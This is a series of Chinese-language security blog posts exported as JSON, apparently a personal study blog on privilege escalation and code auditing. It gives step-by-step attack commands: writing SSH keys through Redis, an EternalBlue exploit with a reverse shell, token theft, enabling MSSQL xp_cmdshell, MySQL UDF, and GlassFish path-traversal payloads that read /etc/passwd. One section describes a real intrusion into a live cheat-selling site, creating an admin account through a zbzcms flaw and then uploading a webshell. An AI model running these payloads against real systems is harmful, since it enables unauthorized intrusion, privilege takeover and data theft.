binpath&#x3D;&quot;C:\\Program.exe&quot;\n\n这里为了方便自己建一个服务，实际情况下可以用真实的服务然后改指向文件。\n\n0x02使用微软自带的工具accesschk查看有哪些不安全的服务：\n工具下载链接：https://download.sysinternals.com/files/AccessChk.zip\n\n\n0x03配置这个服务将它的路径指向我们的后门，开启服务MSF获得会话提权\nsc config &quot;NewServiceName&quot; binpath&#x3D;&quot;C:Programexe&quot;&#x2F;&#x2F;配置服务指向后门\nsc start &quot;NewServiceName&quot;&#x2F;&#x2F;开启服务\n\n\n0x04 windows提权文章windows提权参考文章：https://xz.aliyun.com/t/2519\n大佬写的详细，值得细细揣摩。\n","slug":"权限提升-windows提权2","date":"2022-06-21T15:02:18.000Z","categories_index":"权限提升","tags_index":"权限提升","author_index":"Aurora"},{"id":"2b9713aac0d7c052ca172c6738a7a353","title":"权限提升-数据库提权2","content":"0x00脑图：\n0x01 Redis数据库提权0x00 redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。\nRedis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。\n如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。\nRedis默认绑定在0.0.0.0:6379，攻击者直接可以访问到，默认无密码，登录账户为root。\n0x01 原理满足三点能访问到、能登录、能写入（有root）\n\n开放在公网，没有和ip绑定，默认无密码\nroot权限\nwebshell和公私钥匙通信原理\n有可能把redis的默认端口6379修改\n\n0x02 Redis常用命令1、写入命令，创建备份文件：config set dir &#x2F;home&#x2F;test #创建写入目录config set dbfilename 1.txt #创建写入文件config get dir # 查看目录是否创建成config get dbfilename # 查看文件是否创建成功save\n2、连接数据库命令：redis-cli -h ipssh-keygen -t rsa #生成公私钥，密码设置为空：ssh -I rsa root@ip #免密登录\n3、将公钥写入txt文件（为什么要把公钥写入txt文件里）：(echo -e “\\n\\n”; cat id_rsa.pub; echo -e “\\n\\n”) &gt; 1.txt\n4、将存放公钥的txt文件写入redis服务器：\ncat 1.txt ｜ redis-cli -h ip -x set crack\n5、linux存放公私的地址：&#x2F;root&#x2F;.ssh6、公钥的备份名字：authorized keys\n参考文章：https://www.cnblogs.com/bmjoker/p/9548962.html\n0x03 Redis常见漏洞（1）利用计划任务执行命令反弹 shell\n（2）.写 ssh-keygen 公钥然后使用私钥登陆\n（3）.权限较低往 web 物理路径写 webshell\n最常利用的是第一种，其他两种需要以下条件才可利用：\n\nRedis服务使用ROOT账号启动\n服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。\n\n参考文章：\nhttps://blog.csdn.net/fly_hps/article/details/80937837\n0x04 修复方案（注意：以下操作，均需重启 Redis 后才能生效。）\n1、绑定需要访问数据库的 IP。 将 127.0.0.1 修改为需要访问此数据库的 IP 地址。\n2、设置访问密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。\n3、修改 Redis 服务运行账号。以较低权限账号运行 Redis 服务，禁用账号的登录权限。\n0x02 PostgreSQL 数据库权限提升0x00 提权方式1、低权限提权：CVE-2018-1058\n2、高权限命令执行漏洞：CVE-2019-9193\n###0x01 CVE-2018-1058\n原理：\nPostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。\n版本：9.3-10\n###0x02 CVE-2019-9193\n原理：\nPostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。\n版本：9.3-11\n0x03 漏洞复现利用vulhub开启环境进行漏洞复现：\n\n0x03 令牌窃取提权0x00 令牌简介及原理● 令牌就是系统的临时密钥，相当于账户名和密码，原来决定是否允许这次请求和判断是属于哪一个用户的，他允许你不提供密码或其他凭证的前提下访问网络和系统资源● 令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来● 令牌有很多种：访问令牌（Access Token）表示访问和控制操作主题的系统对象密保令牌（Security Tocken）是一种计算机身份校验的物理设备会话令牌（Session Tocken）的交互会话中唯一的身份标识符\n原理：进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。\n0x01 适用范围Microsoft Windows XP Professional SP3 和之前版本\nWindows Server 2003 SP2 和之前的版本\nWindows Server 2003 x64 和 x64 SP2\nWindows Server 2003（用于基于 Itanium 的系统 SP2 和先前版本）\nWindows Server 2008 x32 x64\nWindows Server 2008（用于基于 Itanium 的系统）\nWindows Vista SP1 和之前的版本\nWindows Vista x64 SP1 和之前的版本\n0x02 实验攻击机kali：192.168.216.135靶机win7：192.168.216.149\n0x03先扫描目标是否存在ms17-010漏洞\n\n看到3这个模块可以利用。\n0x04使用use命令使用此模块：\nmsf6 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010\n\n查看模块配置信息：\n0x05需要我们配置RHOST主机IP，之后run，运行：\nmsf6 &gt; auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.216.149\n\n\n可以看到目标看起来易受攻击，也就表示可能存在相关漏洞。\n0x06查找攻击模块：\n选择第0个永恒之蓝。\n0x07同样，使用use命令加载模块，之后show options：\n0x08设置目标主机ip之后run运行：\nset RHOSTS 192.168.216.149\n\n\n\n可以看到已经获取到了权限。（本意不在这里）\n0x09继续从设置ip处开始：\n找一个payload：\nmsf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; search windows&#x2F;x64&#x2F;shell type:payload\n\n\n挑选第3个反弹shell的payloads：\nmsf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set payload windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp\n\n\n0x10设置一下本机payload监听地址：\nmsf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set LHOST 192.168.216.135\n\n配置完成后exploit开始执行：\nmsf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit\n\n\n\n拿到了权限。（直接是system权限，无语，后面的令牌窃取继续执行）\n0x11先执行use incognito命令，然后输入list_tokens -u列出可用的token：\n\n0x12使用impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;命令窃取令牌，执行shell命令弹出shell：\n获取系统权限。\n0x04 进程注入提权0x00 原理进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。\n使用 pinjector.exe 注入到system用户的进程中，使该进程绑定在0.0.0.0:port ，并建立监听端口，攻击者从攻击机上主动连接该地址，获取到系统的system权限。\n0x01 适用范围适用于windows2008 之前的操作系统。\n0x02上传 pinjector.exe到靶机，执行pinjector.exe -l命令列出所有进程：\n0x03选择一个system权限运行的进程，对此pid进程执行注入，并建立侦听端口：\n执行命令：pinjector.exe -p &lt;pid&gt; cmd &lt;port&gt;\n\n\n0x04使用 nc 连接目标服务器端口：\n执行命令：nc -nv 192.168.0.117 5555\n\n\n连接成功，系统权限。\n###0x05\n进程注入工具下载地址：\nhttps://www.tarasco.org/security/Process_Injector/processinjector.zip\n","slug":"权限提升-数据库提权2","date":"2022-06-21T00:31:26.000Z","categories_index":"权限提升","tags_index":"权限提升","author_index":"Aurora"},{"id":"1989a1e5dad512659756c4dce4a56243","title":"权限提升-数据库提权1","content":"0x00脑图：\n0x01 数据库提权的意义及流程1、意义：在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权；但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除 Access 数据库外，其他数据库基本都存在数据库提权的可能。\n2、流程 ：服务探针-信息收集-提权利用-获取权限\n（一般提权是拥有普通用户的权限之后，或者webshell的权限之后进行的权限提升。）\n0x02 WEB或本地环境探针数据库应用1、通过探针判断有数据库相关的服务\n2、通过端口扫描看是否开启对应端口\n3、通过命令段看是否开启相关服务\n4、通过浏览文件或文件夹判定是否安装相关数据库\n0x03 数据库提权权限用户密码收集等方法1、配置文件、储存文件、暴力拆解、其他方式\n2、配置文件：一些需要调用数据库的程序会有配置文件记录账号密码\n3、储存文件：将数据库中的一些储存文件下载还原，解析里面的账号密码\n4、暴力拆解：通过爆破脚本等爆破密码\n（一般是前两种，第一种最常见。从相关的配置文件中获得账号密码。）\n5、数据库的安装目录下有“data”目录，“data”下的每个文件夹对应数据库，每个文件夹中三个名称相同但后缀名不同的文件对应一个表，其中“.MYD”文件对应表的数据。MySQL数据库的所有账号密码就保存在“MySQL所在的文件夹\\data\\mysql\\user.MYD”中，需要MD5解密。\nroot用户默认不支持外联，暴力破解时可以将爆破脚本上传到服务器，进行本地爆破。\n0x04 Mysql-UDF提权###0x00 原理\nUDF（user definedfunction，用户定义函数），UDF的设计初衷是为了方便用户自定义一些函数，方便查询一些复杂的数据，同时也增加了使用UDF提权的可能。攻击者通过编写调用cmd或者shell的udf.dll文件，并且导入到一个指定的文件夹目录下，创建一个指向udf.dll的自定义函数，从而在数据库中的查询就等价于在cmd或者shell中执行命令。\n0x01 版本差异不同的操作系统，不同的版本，提权时导出udf.dll存放的目录不一样。\n导出数据时根据MySQL版本选择不同的目录：mysql&lt;5.1      导出目录c:&#x2F;windows或system32\nmysql&#x3D;&gt;5.1    导出安装目录&#x2F;lib&#x2F;plugin&#x2F; （其中plugin目录需要自行创建）\n0x02 相关命令select version();         查看版本\nselect @@basedir;    查看安装目录\n（一般通过脚本实现文件导入和命令执行）\n0x03 提权首先是拿到了目标的webshll，获得的这个webshell权限很低。\n\n0x04服务器是部署了mysql的，利用mysql提权，就需要找到mysql的账户和密码。\n首先找配置文件：\n\n这里有个database.php，猜测是数据库配置文件，打开查看：\n得到数据库的账户密码。\n这里还可以通过查看数据库的user.MYD文件，里面存的是用户的密码的hash值，获取了以后可以通过cmd5或者其他途径进行解密。\n\n\n\n将密码进行md5解密：\n0x05拿到数据库账号密码。开始对数据库连接：\n0x06查看mysql的安装路径（绝对路径）\n\n0x07查看mysql的版本。发现是5.2版本，所以需要将dll文件放在lib\\plugin目录下才可以生效，如果是5.1以下，需要放到 C:\\Windows\\system32下\n\n0x08找到lib目录：（如果没有lib目录需要手动创建）\n\n使用命令创建路径：,执行命令后发现报的是失败，但是检查文件夹，确实已经创建。\n\n\n0x09使用同样的方法创建plugin文件夹。\n使用直接导入的方式将udf.dll文件到指定位置。（udf.dll我以txt的形式放在附件）\n\n0x10创建sys_eval函数，用于执行命令和回显：\n\n0x11查看权限为系统权限：\n0x05 Mysql-MOF提权0x00 原理mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。\n0x01参考文章：https://www.cnblogs.com/xishaonian/p/6384535.html\n0x06 Mssql提权0x00 xp_cmdshell提权xp_cmdshell默认在 mssql2000中是开启的，在mssql2005之后的版本中则默认禁止（这里2008就是禁用的）。如果用户拥有管理员sa权限则可以用 sp_configure 重新开启它。\n0x01查找xp_cmdshell：\n\n0x02通过xp_cmdshell执行命令whoami: EXEC master.dbo.xp_cmdshell ‘命令’ \n\n\n这里被阻止执行了，原因是因为没有开启xp_cmdshell。\n0x03使用sp_configure开启xp_cmdshell（这里1就是开启，0是关闭）\n启用命令：\nEXEC sp_configure &#39;show advanced options&#39;,1;\n\nRECONFIGURE;\n\nEXEC sp_configure &#39;xp_cmdshell&#39;,1;\n\nRECONFIGURE;\n\n\n关闭命令：\nExec sp_configure &#39;show advanced options&#39;,1 ；\n\nreconfigure;\n\nexec sp_configure &#39;xp_cmdshell&#39;,0;\n\nreconfigure;\n\n\n\n0x04再次执行EXEC master.dbo.xp_cmdshell ‘命令’ ：\n\n成功提权。\n0x05  使用 sp_oacreate进行提权主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。\n0x06执行命令：\ndeclare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod\n@shell,&#39;run&#39;,null,&#39;c:\\windows\\system32\\cmd.exe &#x2F;c whoami &gt;c:\\\\1.txt&#39;\n调用cmd.exe执行whoami,并将结果输出为1.txt（便于查看回显结果）\n\n\n\n0x07同样，开启组件：\n\n启动命令：\nEXEC sp_configure &#39;show advanced options&#39;, 1;\nRECONFIGURE WITH OVERRIDE;\nEXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;\nRECONFIGURE WITH OVERRIDE;\n\n关闭命令：\nEXEC sp_configure &#39;show advanced options&#39;, 1;\nRECONFIGURE WITH OVERRIDE;\nEXEC sp_configure &#39;Ole Automation Procedures&#39;, 0;\nRECONFIGURE WITH OVERRIDE;\n\n\n0x08再次执行命令：\n没有生成1.txt文件；过程思路就是这样的。\n###0x09\nSQL Server提权方法汇总：\nhttps://blog.51cto.com/u_11797152/2411770\n0x07 Oracle提权0x00Oracle数据库一般用于Java和jsp,如果jsp可以获取到后门的话，后门不需要提权，网站权限就是系统权限。\n0x01 普通用户模式前提是拥有一个普通的Oracle连接账号。不需要DBA权限，可提权至DBA，并以Oracle实例运行的权限执行操作系统命令。\n0x02 DBA用户模式拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。（DBA账号是Oracle的最高权限） （使用自动化工具Oracleshellv1.0工具）\n\n0x03 注入提升模式拥有一个Oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。（前提是要有注入点），再配合Oracleshell进行命令执行\n—SQLmap判断数据库是不是dba权限：\nsqlmap.py -u http:&#x2F;&#x2F;192.168.131.142:8080&#x2F;sql.jsp?id-7698 --is-dba\n\n","slug":"权限提升-数据库提权1","date":"2022-06-20T08:13:30.000Z","categories_index":"权限提升","tags_index":"权限提升","author_index":"Aurora"},{"id":"e38c975ecb9beb0ae47fa044c10774fe","title":"权限提升-windows提权","content":"0x00脑图：\n0x01 windows权限划分0x00 普通权限\n\n\n\n\n\n\n\n\n1、默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(PowerUsers)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。\n2、管理员组拥有大部分的计算机操作权限（并不是全部），能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限)。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users)经过ms验证程序登录的用户均属于此组。\n0x01 特殊权限\n\n\n\n\n\n\n\n\n​        除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、CREATOR OWNER(创建者)等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。​        真正拥有“完全访问权的只有一个成员：SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。​        “所有人权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限一一任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员，​        被标记为“创建者“权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。​         但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。​        无论是普通权限还是特殊权限，它们都可以“叠加使用，“叠加就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组在加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加的使用就能减轻一部分劳动量了。\n0x02 windows提权命令\n\n\n命令\n描述\n\n\n\nsysteminfo\n打印系统信息\n\n\nwhoami\n获得当前用户名\n\n\nwhami&#x2F;priv\n当前账户权限\n\n\nipconfig\n网络配置信息\n\n\nipconfig&#x2F;displaydns\n显示DNS缓存\n\n\nroute print\n打印出路由表\n\n\narp -a\n打印arp表\n\n\nhostname\n主机名\n\n\nnet user\n列出用户\n\n\nnet user UserName\n关于用户的信息\n\n\nnet use\\SMBPATH Pa$$w0rd &#x2F;u:UserName\n连接SMB\n\n\nnet localgroup GROUP\n关于指定组的信息\n\n\nnet view \\127.0.0.1\n会话打开到当前计算机\n\n\nnet session\n开放给其他机器\n\n\nnetsh firewall show config\n显示防火墙配置\n\n\nDRIVERQUERY\n列出安装的驱动\n\n\ntasklist&#x2F;svc\n列出服务任务\n\n\nnet start\n列出启动的服务\n\n\ndir &#x2F;s foo\n在目录中搜索包含指定字符的项\n\n\ndir &#x2F;s foo&#x3D;&#x3D;bar\n同上\n\n\nsc query\n列出所有服务\n\n\nsc qc Service Name\n找到指定服务的路径\n\n\nshutdown &#x2F;r &#x2F;t 0\n立即重启\n\n\ntype file.txt\n打印出内容\n\n\nicacls”C:\\Example”\n列出权限\n\n\nwmic qfe get Caption,Description,Hot FixID,InstalledOn\n列出已安装的补丁\n\n\n(New-Object System.Net.WebClient).DownloadFile(“http://host/file&quot;,&quot;C:\\LocalPath“)\n利用ps远程下载文件到本地\n\n\naccesschk.exe -qwsu “Group”\n修改对象（尝试Everyone，Authenticated Users和&#x2F;或Users）\n\n\n0x03 本地提权-系统溢出漏洞0x00靶机：winserver2008R2\n0x01首先使用whoami命令查看当前权限为管理员权限，由于要提权，再创建一个普通用户；\n创建用户命令：net user hhh haha@123456@ww /add（hhh为用户名，haha@123456@ww为密码）\n\n查看本地组：\n将新创建的hhh加入到Guests组：\n命令：net localgroup Guests hhh /add\n\n使用win+L切换用户：\n0x02利用CVE-2020-0787本地提权漏洞，在目标服务器执行BitsArbitraryFileMoveExploit.exe文件\n直接拖进cmd运行：\n运行结束后会自动弹出cmd窗口，使用whoami查看当前权限：\n成功获得system权限，提权成功。\n0x03 总结原理：\n通过普通用户连接到计算机，只有普通用户权限，这个时候就可以使用这个本地提权漏洞将当前计算机的普通权限提升到系统权限。\n0x04 本地提权-AT&amp;SC&amp;PS 命令0x00 AT提权at提权原理：at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用system权限。\n适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除。\n当我们拿到低权限的用户，通过连接上服务器后，可以通过at命令来进行本地提权。\n0x01测试主机：winserver2003\n命令：at 11:00 &#x2F;interactive cmd (在11:00分生成一个交互式的System权限的cmd)\n\n\n0x02提权成功：\n\n0x03 SC提权sc提权原理：sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。\n适用版本：windows 7、8、03、08、12、16（win2003可以提权，其他未测基本失败）。\n0x04创建一个名叫syscmd的新的交互式的cmd执行服务：\n命令：&#96;sc Create syscmdd binPath&#x3D; &quot;cmd &#x2F;K start&quot; type&#x3D; own type&#x3D; interact&#96;\n\n运行服务之后，启动服务命令：sc start syscmd\n提权成功。\n0x05 PS提权适用范围： 适用于Win2003 &amp; Win2008\n微软官方工具包pstools：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools\n0x06命令：psexec.exe -accepteula -s -i -d cmd\n\n\n提权成功。\n0x05 总结1、渗透流程：\n信息收集—补丁筛选—利用MSF或者特定EXP—执行—拿到权限\n（优先使用MSF，MSF没有找特定的EXP）\n2、提权方法有部分适用在不同环境（本地提权比web提权成功几率大），当然也有通用方法（看是否在powershell还是cmd）\n3、提权方法也有操作系统版本区别，特性决定方法利用面\n4、提权方法有部分需要特定环境，如数据库，第三方提权等\n","slug":"权限提升-windows提权","date":"2022-06-19T14:00:54.000Z","categories_index":"权限提升","tags_index":"权限提升","author_index":"Aurora"},{"id":"f8af41c2e2288536f49250d641a67ce7","title":"权限提升-网站后台漏洞第三方获取","content":"0x00脑图：\n\n0x01 权限分类\n\n\n\n\n\n\n\n\n1、后台权限：（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录）\n一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据）\n\n\n\n\n\n\n\n\n\n2、网站权限：（获得方式：以上三种思路获取）\n查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。\n\n\n\n\n\n\n\n\n\n3、数据库权限：操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。\n\n\n\n\n\n\n\n\n\n4、接口权限：（邮件，短信，支付，第三方登录等）\n后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取）。\n\n\n\n\n\n\n\n\n\n5、还有其他的系统权限，域控权限等\n0x02 某外挂网站的简单渗透提权（实战）0x00网站首页：\n0x01首先看下源代码搜集下相关信息：\n\n\n没有特别的信息，只有图片地址，和相关页面的目录。\n搜索一下图片地址：\n\n可以看到应该是zbzcms的模板。\n0x02找到站帮主源码进行下载，查看其结构：\n\n\n在源码中找到后台登录地址：\n0x03尝试访问某外挂网站的后台地址：\n\n\n可以看到后台登录界面；没有账号密码就拿不到后台权限，找一下zbzcms的相关漏洞。\n0x04使用seay打开其源码进行审计，先自动审计一波，尤其是要找SQL注入漏洞可以获取管理员账号密码，或者直接未授权访问：\n\n看到admin文件夹下的文件存在insert(&#39;admin&#39;,$POST);字段，猜测admin字段是添加管理员的字段，打开源码审计：\n可以看到确实是添加管理员的代码段。\n可以看到mima和guanliyuan可疑字段，接收密码和管理员参数。\n若变量$run==&#39;admin&#39;则使用POST方法接收的mima和guanliyuan&#x3D;登录时接收的mima和guanliyuan，就进行管理员的添加。\n0x05构造payload：\nURL：&#x2F;cms&#x2F;cms&#x2F;admin&#x2F;run_ajax.php?run&#x3D;admin\n    POST数据：mima&#x3D;123456&amp;guanliyuan&#x3D;hhh\n\n利用插件执行payload：\n\n执行payload后有返回值，返回了117。\n0x06尝试使用账号密码登录：\n\n这里登录不成功是由于权限不足。\n分析代码可知，需要添加dengji&#x3D;1，设置为超级管理员：\n\npayload中加入dengji&#x3D;1：\nmima&#x3D;123456&amp;guanliyuan&#x3D;hhh&amp;dengji&#x3D;1\n\n\n继续尝试登录，成功登录后台：\n\n这里已经拿到了后台权限，继续提权，拿到网站权限。\n0x07来到根目录看到upload，应该是上传图片的目录：\n打开upload看到有上传功能：\n先尝试上传，看看有没有验证：\n\n成功上传1.php文件（一点没有验证）。\n0x08使用蚁剑连接：\n可以看到有网站备份文件，可以直接打包下载。\n0x03 GlassFish 第三方中间件0x00FOFA搜索GlassFish的ip\n\n其服务是GlassFish。\n0x01网上搜GlassFish中间件的漏洞：\n\n0x02访问地址：\n找到payload执行：\nhttp:&#x2F;&#x2F;xxxxx&#x2F;theme&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;windows&#x2F;win.ini\n\n\n返回win.ini相关数据。\n注意：这里payload执行是要区分windows和linux系统。（上面为windows系统payload）\nLinux系统payload：\nhttp:&#x2F;&#x2F;xxxxx&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd\n\n\n\n0x03后续可利用漏洞进行敏感文件的读取等等。\n0x04 总结漏洞产生的原因多层面：操作系统，中间件，网站，后台，数据库，第三方插件等等\n\n\n\n\n\n\n\n\n\n1、内网渗透中主机权限的获取：1.网站，2.数据库，3.HTTP\n2、具体的权限：1.后台权限2.网站权限3.数据库权限4.接口权限5.系统权限，6.域控权限\n3、后台权限：一般网站或者应用后台只能操作应用界面内容数据图片信息，无法操作程序的源代码，或者服务器的资源文件。（如果后台存在文件操作，也可以操作文件）（获取方式：爆破，注入猜解，弱口令）\n4、网站权限：查看或者修改程序源代码，可以进行网站的配置文件读取（接口配置信息，数据库配置信息等等），还能收集服务器操作系统的信息，为后续系统提权铺垫（文件上传）\n5、数据库权限：操作数据库增删改查等等（获取方式：源码或者配置文件泄露，也可以是网站权限（webshell）进行数据库配置文件读取）\n6、接口权限：邮件，短信，支付，第三方支付（更改接口，可以更改支付，或者调用短信轰炸）\n7、相关操作被拒绝无法实现的时候，就会涉及到权限提升\n","slug":"权限提升-网站后台漏洞第三方获取","date":"2022-06-19T01:32:42.000Z","categories_index":"权限提升","tags_index":"权限提升","author_index":"Aurora"},{"id":"189405de58d744911bbd6ef55ac89edc","title":"代码审计-TP5框架1","content":"0x00脑图：\n\n0x01 Metinfo-无框架-变量覆盖-自动审计或搜索0x00打开靶场：\n\n0x01使用seay先进行自动审计：\n检测到可能存在变量覆盖漏洞：\n0x02打开其配置文件审计相关函数：\n\n\n可以看到双$$符号。\nforeach()函数，每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元），这里相当于两个循环的for循环，第一个request分别循环三种传参方法；第二个循环，当前单元的键名也会在每次循环中被赋给变量 $key，之后$key又赋值给value，然后再将value的值过滤后赋值给$key，总之，就是通过get，post，cookie接受数据，进行变量覆盖 。\n涉及函数：\nforeach()函数：遍历给定的数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。\n php中的=&gt;：一般用作数组键名与元素的连接符。简单来说就是使用&#x3D;&gt;符号来分隔键和值，左侧表示键，右侧表示值。\n\n0x03由于配置文件几乎全局包含，搜索相关包含其文件的文件：\nindex.php包含其文件。\n\n0x04由于common.inc.php文件可能存在变量覆盖漏洞，将index.php文件添加测试语句进行测试；由于现在打开的index.php文件不是网站首页文件：\n网站首页文件内在templates目录下：\n\n在index.php文件中写入测试语句：\n接着在index.html文件中输出：\n网站首页看到test的数据：\n\n注意：在index.php文件中，test变量的赋值一定要在index.php文件中的包含文件common.inc.php的上方，不然test变量的值不会改变。\n0x05传参：test接收值123456，返回值123465，而不是asdas，实现了变量覆盖。\n\n0x06审计：三种方式传参的值都可以接受，比如这里GET接收test\nforeach($_GET as $_key&#x3D;&gt;$_value)\nget传参test&#x3D;111,相当于数组{“test”:”111”}\n那么$_key&#x3D;test;$_value&#x3D;111,而$_value的过滤类似魔术引号加&#x2F;&#x2F;只对注入防范有用，这里对111不起作用\n这里就会将$test&#x3D;$_value&#x3D;111 \n\n0x07 配合文件包含漏洞进行攻击条件：\n1、include($filename)\n2、包含文件common.inc.php \n先搜索文件包含漏洞关键函数：include，include_once，require require_once 等：\n\n发现有一个$moudle变量，打开文件查看：\n\n没有包含common.inc.php变量覆盖文件，无法利用。\n打开moudle.php文件，包含了common.inc.php变量覆盖文件：\n表示这个index.php文件间接包含了common.inc.php变量覆盖文件：\nrequire_once()函数：\n\n0x08审计：\n查看原来module的赋值条件，通过判断fmofule的值，当fmofule&#x3D;7并且变量list为空时，module就等于$modulefname[$mdle][$mdtp]，这里我们只需要确定module有赋值，然后我们去覆盖就行，不用确定module的值。\n\n0x09访问存在文件包含漏洞的目录about&#x2F;index.php：\n构造payload：\nhttp:&#x2F;&#x2F;metinfo&#x2F;about&#x2F;index.php?fmodule&#x3D;7&amp;module&#x3D;1.txt\n\n\n\n成功打开1.txt文件，执行phpinfo()函数。\n后续只需上传任意文件，只需更改module值，访问上传的文件地址进行getshell。\t\n0x02 Thinkphp5框架0x00打开网站：\n\n其中的APPlication是应用的目录：\n\n具体参考文章：\nhttps://www.kancloud.cn/thinkphp/thinkphp5-guide/90110\n0x01这段代码的作用就是定义应用目录APP_PATH和加载ThinkPHP框架的入口文件：\n\n\n首页加载的文件实在APPlication目录下的：\n具体解释：\n0x02 测试class中写入test方法，浏览器按照格式访问，如图：\n\n\n0x03 Thinkphp版本查看1、通过url的报错查看：\n2、readme文件查看：\n0x04ThinkPHP网上的历史版本的漏洞：\n\nThinkPHP-Vuln：\nhttps://github.com/Mochazz/ThinkPHP-Vuln\n0x05 